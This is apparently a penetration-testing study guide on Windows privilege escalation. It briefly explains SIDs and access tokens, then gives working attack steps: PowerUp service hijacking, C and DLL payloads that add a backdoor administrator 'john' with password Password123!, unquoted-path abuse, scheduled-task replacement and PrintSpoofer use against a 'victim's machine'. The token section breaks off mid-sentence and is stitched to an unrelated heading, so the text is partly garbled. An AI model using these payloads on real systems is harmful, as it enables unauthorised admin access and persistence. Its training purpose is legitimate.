# Understanding Windows Privileges and Access Control Mechanisms

Privileges define what a Windows account can do (e.g., modify files, add users). Windows uses several mechanisms to control this:

## Security Identifiers (SID)

- Unique values that identify users, groups, and other principals.
- Generated by the Local Security Authority (LSA) for local accounts or by a Domain Controller (DC) for domain accounts.
- Structure: `S-R-X-Y`
    
    - `S`: SID literal
        
    - `R`: Revision (always 1)
        
    - `X`: Identifier authority (commonly 5 for NT Authority)
        
    - `Y`: Sub-authorities (domain ID + Relative ID)

Example local user SID:

```
S-1-5-21-1336799502-1441772794-948155058-1001
```

Well-known SIDs:

```
S-1-0-0                       Nobody
S-1-1-0                       Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

## Access Tokens

- Created at authentication to define a user’s **security context**.
- Contain: user SID, group SIDs, privileges, and scope info.
- **Primary token**: assigned to processes/threads.
- **Impersonation token**: lets a thread act under

# Hidden in Plain Sight

```powershell
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

# Service Binary Hijacking
## PowerUp

Another useful tool to check privilege escalation vector is [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). We can upload it on the victim's machine and then use it to gain knowledge and exploit the privileges misconfiguration on the services. First, we enable the PowerShell scripting capability.

```powershell
powershell -ep bypass
```

Then we enable PowerUp

```powershell
. .\PowerUp.ps1
```

To list modifiable service we use

```powershell
Get-ModifiableServiceFile
```

Once we spot an interesting service, we can try to abuse it with

```powershell
Install-ServiceBinary -Name '<SERVICENAME>'
```

This will create the admin user `john` with password `Password123!`. To log-in with the created user we can restart the service (if we have the correct permissions and PowerUp.ps1 automatically uses the right arguments). Eventually we can restart the machine in order to have all services restarted. We also must notice that if the service require some additional configurations, for example passing a configuration file, the PowerUp.ps1 script will fail and we must exploit manually the privilege escalation, setting the right path to the configurations of the service (eg: mysql).

If we have to manually load a custom exploit into the service we can directly write the C code and compile it for our needs

```c
#include <stdlib.h>

int main ()
{
  int payload;
  
  payload = system ("net user john Password123! /add");
  payload = system ("net localgroup administrators john /add");
  
  return 0;
}
```

And then compile it with

```shell
x86_64-w64-mingw32-gcc payload.c -o payload.exe
```

# Service DLL Hijacking

DLL are the specular 'Shared Object' on Linux. They are libraries that provide functionalities for executable programs. With the program [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) we can monitor program calls. If we find that a program calls a DLL that is missing, it may be replaced (if we have the correct read/write permissions) by our malicious DLL. We can craft the DLL following [Microsoft's guidelines](https://learn.microsoft.com/it-it/troubleshoot/windows-client/deployment/dynamic-link-library) and insert into the case `DLL_PROCESS_ATTACHED` our code. The code can be similar to the previous code for the manual privilege escalation using Windows services.

This is the order Windows search for DLLs

```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

The following C program can be used to exploit a missing DLL

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int payload;
        payload = system ("net user john Password123! /add");
        payload = system ("net localgroup administrators john /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

We will then compile it on the Linux machine with the `--shared` option and we load it in the Windows machine **in the path and with the name that Windows expect the DLL to have**. Obviously this works only if we have the **WRITE** permission on that files.

```shell
x86_64-w64-mingw32-gcc calledDll.cpp --shared -o calledDll.dll
```

Transfer the file and restart the service with

```powershell
Restart-Service <SERVICENAME>
```

And we will be able to execute a shell as admin with the user john. We could not be able to log-in via RDP because the user may not be in the RDP group.

# Unquoted Service Paths

When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is). In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument.

We find unquoted paths with the command

```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

We must check if we have write permissions on the executable in order to replace it with a new one.

```powershell
icacls "C:\Program Files\Enterprise Apps\path\to\service.exe"
```

Then if we have permission on the service we can start or stop it with `Start-Service` or `Stop-Service` command. Once we got the paths we can use PowerUp.ps1 for exploiting the service. This means the service will be replaced with a malicious exe.

```powershell
Get-UnquotedService
powershell -ep bypass
. .\PowerUp.ps1
```

And finally we run the command to overwrite the service with

```powershell
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```

Now restarting the service will grant us an Administrator account with user john and Password123! as credentials

```powershell
Restart-Service GammaService
```

# Scheduled Tasks

If a task is executed periodically, we can exploit the called program if we have write permissions on it. To seek for scheduled tasks we can run.

```powershell
schtasks /query /fo LIST /v
```

Eventually we can use `findstr` if we want to search for something specific. After that we can replace the program with a simple .exe that creates a new admin user.

# Using exploits

We can use multiple exploits for Windows, depending on the privileges we got on the system. An example could be [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe). We could serve it on the victim machine. If we have `SeImpersonatePrivilege` privilege displayable with `whoami /priv` we could gain Admin privileges with

```powershell
.\PrintSpoofer64.exe -i -c powershell.exe
```

There is a wide range of this exploits. We can use the whole [Potato Family](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) and perform a Privilege Escalation. A real-life scenario of a Windows privilege escalation could be exploiting the [`SeBackupPrivilege`](https://juggernaut-sec.com/sebackupprivilege).